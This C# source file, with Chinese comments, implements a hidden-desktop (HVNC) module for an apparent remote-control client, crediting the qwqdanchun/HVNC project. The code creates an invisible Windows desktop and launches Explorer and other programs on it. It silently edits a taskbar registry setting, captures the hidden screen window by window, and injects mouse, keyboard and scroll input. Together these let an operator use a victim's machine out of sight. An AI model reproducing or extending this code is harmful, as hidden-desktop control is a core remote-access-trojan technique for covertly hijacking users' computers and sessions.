using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteControl.Client.Utils
{
    /// <summary>
    /// 隐藏虚拟桌面管理 - 使用 Windows Desktop API
    /// </summary>
    public partial class HVNCDesktop : IDisposable
    {
        private IntPtr _hDesktop = IntPtr.Zero;
        private string _desktopName;
        private bool _disposed = false;

        public string DesktopName { get { return _desktopName; } }

        /// <summary>
        /// 创建隐藏桌面
        /// </summary>
        public bool Create(string name)
        {
            _desktopName = name;
            _hDesktop = CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);
            return _hDesktop != IntPtr.Zero;
        }

        /// <summary>
        /// 在隐藏桌面上启动进程
        /// 参考qwqdanchun/HVNC: 使用cmd.exe /c start方式启动，利用Windows PATH搜索
        /// </summary>
        public bool StartProcess(string filePath, string arguments)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = _desktopName;
            PROCESS_INFORMATION pi;

            // 参考项目技术：通过cmd.exe /c start启动，可以搜索PATH和文件关联
            string cmdLine;
            if (filePath.IndexOf('\\') >= 0 || filePath.IndexOf('/') >= 0
                || filePath.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            {
                // 已经是完整路径或.exe文件，用cmd /c start启动
                cmdLine = string.IsNullOrEmpty(arguments)
                    ? "cmd.exe /c start \"\" \"" + filePath + "\""
                    : "cmd.exe /c start \"\" \"" + filePath + "\" " + arguments;
            }
            else
            {
                cmdLine = string.IsNullOrEmpty(arguments)
                    ? "cmd.exe /c start \"\" " + filePath
                    : "cmd.exe /c start \"\" " + filePath + " " + arguments;
            }

            return CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero,
                false, 0, IntPtr.Zero, null, ref si, out pi);
        }

        /// <summary>
        /// 直接在隐藏桌面上创建进程(不通过cmd)
        /// </summary>
        private bool StartProcessDirect(string filePath, string arguments)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = _desktopName;
            PROCESS_INFORMATION pi;

            string cmdLine = string.IsNullOrEmpty(arguments)
                ? filePath
                : filePath + " " + arguments;

            return CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero,
                false, 0, IntPtr.Zero, null, ref si, out pi);
        }

        /// <summary>
        /// 参考qwqdanchun/HVNC: 启动Explorer并正确配置任务栏
        /// 设置TaskbarGlomLevel注册表 + 等待任务栏出现 + 设置置顶
        /// </summary>
        public void StartExplorerWithTaskbar()
        {
            try
            {
                // 设置任务栏不合并(参考项目技术)
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true))
                {
                    if (key != null)
                        key.SetValue("TaskbarGlomLevel", 2, Microsoft.Win32.RegistryValueKind.DWord);
                }
            }
            catch { }

            // 使用完整路径直接启动explorer(不通过cmd)
            string explorerPath = System.IO.Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe");
            StartProcessDirect(explorerPath, "");

            // 等待任务栏窗口出现(最多5秒)
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            SetThreadDesktop(_hDesktop);
            try
            {
                for (int i = 0; i < 10; i++)
                {
                    System.Threading.Thread.Sleep(500);
                    IntPtr hTaskbar = FindWindow("Shell_TrayWnd", null);
                    if (hTaskbar != IntPtr.Zero)
                    {
                        // 设置任务栏置顶
                        SetWindowPos(hTaskbar, HWND_TOPMOST, 0, 0, 0, 0,
                            SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
                        break;
                    }
                }
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 截取隐藏桌面屏幕 - 使用PrintWindow逐窗口渲染
        /// 参考qwqdanchun/HVNC技术：从底层窗口到顶层逐个PrintWindow并合成
        /// </summary>
        public Bitmap CaptureScreen()
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return null;

            try
            {
                int width = GetSystemMetrics(SM_CXSCREEN);
                int height = GetSystemMetrics(SM_CYSCREEN);
                if (width == 0 || height == 0)
                {
                    width = 1920;
                    height = 1080;
                }

                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr memDC = CreateCompatibleDC(hdc);
                IntPtr hBitmap = CreateCompatibleBitmap(hdc, width, height);
                IntPtr oldBitmap = SelectObject(memDC, hBitmap);

                // 先尝试PrintWindow方式逐窗口合成
                bool captured = CaptureUsingPrintWindow(hdc, memDC, width, height);

                // 如果PrintWindow方式没有捕获到任何窗口，降级到BitBlt
                if (!captured)
                    BitBlt(memDC, 0, 0, width, height, hdc, 0, 0, SRCCOPY);

                SelectObject(memDC, oldBitmap);
                Bitmap bmp = System.Drawing.Image.FromHbitmap(hBitmap);

                DeleteObject(hBitmap);
                DeleteDC(memDC);
                ReleaseDC(IntPtr.Zero, hdc);

                return bmp;
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 使用PrintWindow方式从底到顶合成所有可见窗口
        /// </summary>
        private bool CaptureUsingPrintWindow(IntPtr hdc, IntPtr hDcScreen, int screenW, int screenH)
        {
            // 收集所有可见窗口（从顶到底的Z序）
            var windows = new System.Collections.Generic.List<IntPtr>();
            EnumDesktopWindows(_hDesktop, (hWnd, lParam) =>
            {
                if (IsWindowVisible(hWnd))
                    windows.Add(hWnd);
                return true;
            }, IntPtr.Zero);

            if (windows.Count == 0)
                return false;

            // 反转为从底到顶的顺序进行绘制
            windows.Reverse();

            foreach (IntPtr hWnd in windows)
            {
                RECT rect;
                if (!GetWindowRect(hWnd, out rect))
                    continue;

                int winW = rect.Right - rect.Left;
                int winH = rect.Bottom - rect.Top;
                if (winW <= 0 || winH <= 0)
                    continue;

                IntPtr hDcWindow = CreateCompatibleDC(hdc);
                IntPtr hBmpWindow = CreateCompatibleBitmap(hdc, winW, winH);
                IntPtr oldObj = SelectObject(hDcWindow, hBmpWindow);

                // PrintWindow让窗口自己绘制到我们的DC中
                // 使用PW_RENDERFULLCONTENT(2)支持Windows 10/11 DWM合成窗口
                if (PrintWindow(hWnd, hDcWindow, PW_RENDERFULLCONTENT))
                {
                    BitBlt(hDcScreen, rect.Left, rect.Top, winW, winH,
                        hDcWindow, 0, 0, SRCCOPY);
                }

                // 设置WS_EX_COMPOSITED改善渲染效果
                int style = GetWindowLong(hWnd, GWL_EXSTYLE);
                SetWindowLong(hWnd, GWL_EXSTYLE, style | WS_EX_COMPOSITED);

                SelectObject(hDcWindow, oldObj);
                DeleteObject(hBmpWindow);
                DeleteDC(hDcWindow);
            }

            return true;
        }

        /// <summary>
        /// 向隐藏桌面注入鼠标事件
        /// 参考qwqdanchun/HVNC: 使用WindowFromPoint + ChildWindowFromPoint递归找到最深层子窗口
        /// </summary>
        public void InjectMouseEvent(int x, int y, int button, int operation)
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return;

            try
            {
                POINT screenPoint;
                screenPoint.X = x;
                screenPoint.Y = y;

                // 用WindowFromPoint找到点击位置的顶层窗口
                IntPtr hWnd = WindowFromPoint(screenPoint);
                if (hWnd == IntPtr.Zero)
                {
                    // fallback到枚举方式
                    hWnd = FindWindowAtPoint(x, y);
                    if (hWnd == IntPtr.Zero) return;
                }

                // 确定消息类型
                uint msg = WM_MOUSEMOVE;
                switch (operation)
                {
                    case 0: // MouseDown
                        msg = (button == 1) ? WM_LBUTTONDOWN : WM_RBUTTONDOWN;
                        break;
                    case 1: // MouseUp
                        msg = (button == 1) ? WM_LBUTTONUP : WM_RBUTTONUP;
                        break;
                    case 2: // MouseMove
                        msg = WM_MOUSEMOVE;
                        break;
                    case 3: // DoubleClick
                        msg = (button == 1) ? WM_LBUTTONDBLCLK : WM_RBUTTONDBLCLK;
                        break;
                }

                // 参考项目核心技术：递归找到最深层子窗口
                POINT point = screenPoint;
                IntPtr targetWnd = hWnd;
                for (;;)
                {
                    IntPtr prevWnd = targetWnd;
                    ScreenToClient(targetWnd, ref point);
                    IntPtr childWnd = ChildWindowFromPoint(targetWnd, point);
                    if (childWnd == IntPtr.Zero || childWnd == targetWnd)
                        break;
                    targetWnd = childWnd;
                    // 重置坐标为屏幕坐标重新开始下一层转换
                    point = screenPoint;
                }

                // 最终坐标转换为目标窗口的本地坐标
                POINT localPoint = screenPoint;
                ScreenToClient(targetWnd, ref localPoint);
                IntPtr lParam = (IntPtr)((localPoint.Y << 16) | (localPoint.X & 0xFFFF));

                PostMessage(targetWnd, msg, IntPtr.Zero, lParam);
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 向隐藏桌面注入键盘事件
        /// </summary>
        public void InjectKeyboardEvent(int keyCode, bool isKeyDown)
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return;

            try
            {
                IntPtr hWnd = GetForegroundWindowOnDesktop();
                if (hWnd == IntPtr.Zero) return;

                // 递归找焦点子窗口
                IntPtr targetWnd = hWnd;
                RECT rect;
                GetClientRect(hWnd, out rect);
                POINT center;
                center.X = (rect.Right - rect.Left) / 2;
                center.Y = (rect.Bottom - rect.Top) / 2;
                for (;;)
                {
                    IntPtr childWnd = ChildWindowFromPoint(targetWnd, center);
                    if (childWnd == IntPtr.Zero || childWnd == targetWnd)
                        break;
                    targetWnd = childWnd;
                    GetClientRect(targetWnd, out rect);
                    center.X = (rect.Right - rect.Left) / 2;
                    center.Y = (rect.Bottom - rect.Top) / 2;
                }

                uint msg = isKeyDown ? WM_KEYDOWN : WM_KEYUP;
                PostMessage(targetWnd, msg, (IntPtr)keyCode, IntPtr.Zero);
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 在隐藏桌面上找到指定点的窗口
        /// </summary>
        private IntPtr FindWindowAtPoint(int x, int y)
        {
            IntPtr found = IntPtr.Zero;
            EnumDesktopWindows(_hDesktop, (hWnd, lParam) =>
            {
                if (!IsWindowVisible(hWnd)) return true;
                RECT rect;
                GetWindowRect(hWnd, out rect);
                if (x >= rect.Left && x <= rect.Right &&
                    y >= rect.Top && y <= rect.Bottom)
                {
                    found = hWnd;
                    return false;
                }
                return true;
            }, IntPtr.Zero);
            return found;
        }

        /// <summary>
        /// 获取隐藏桌面上的前台窗口(第一个可见窗口)
        /// </summary>
        private IntPtr GetForegroundWindowOnDesktop()
        {
            IntPtr found = IntPtr.Zero;
            EnumDesktopWindows(_hDesktop, (hWnd, lParam) =>
            {
                if (IsWindowVisible(hWnd))
                {
                    found = hWnd;
                    return false;
                }
                return true;
            }, IntPtr.Zero);
            return found;
        }

        public void Dispose()
        {
            if (!_disposed && _hDesktop != IntPtr.Zero)
            {
                CloseDesktop(_hDesktop);
                _hDesktop = IntPtr.Zero;
                _disposed = true;
            }
        }

        /// <summary>
        /// 获取虚拟桌面实际分辨率
        /// </summary>
        public void GetScreenResolution(out int width, out int height)
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
            {
                width = 1920;
                height = 1080;
                return;
            }
            try
            {
                width = GetSystemMetrics(SM_CXSCREEN);
                height = GetSystemMetrics(SM_CYSCREEN);
                if (width == 0 || height == 0)
                {
                    width = 1920;
                    height = 1080;
                }
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 向隐藏桌面注入滚轮事件
        /// </summary>
        public void InjectScrollEvent(int x, int y, int delta)
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return;

            try
            {
                POINT screenPoint;
                screenPoint.X = x;
                screenPoint.Y = y;

                IntPtr hWnd = WindowFromPoint(screenPoint);
                if (hWnd == IntPtr.Zero)
                {
                    hWnd = FindWindowAtPoint(x, y);
                    if (hWnd == IntPtr.Zero) return;
                }

                // 递归找最深层子窗口
                POINT point = screenPoint;
                IntPtr targetWnd = hWnd;
                for (;;)
                {
                    ScreenToClient(targetWnd, ref point);
                    IntPtr childWnd = ChildWindowFromPoint(targetWnd, point);
                    if (childWnd == IntPtr.Zero || childWnd == targetWnd)
                        break;
                    targetWnd = childWnd;
                    point = screenPoint;
                }

                // WM_MOUSEWHEEL: wParam = delta << 16, lParam = screen coords
                IntPtr wParam = (IntPtr)(delta << 16);
                IntPtr lParam = (IntPtr)((y << 16) | (x & 0xFFFF));
                PostMessage(targetWnd, WM_MOUSEWHEEL, wParam, lParam);
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

    }
}
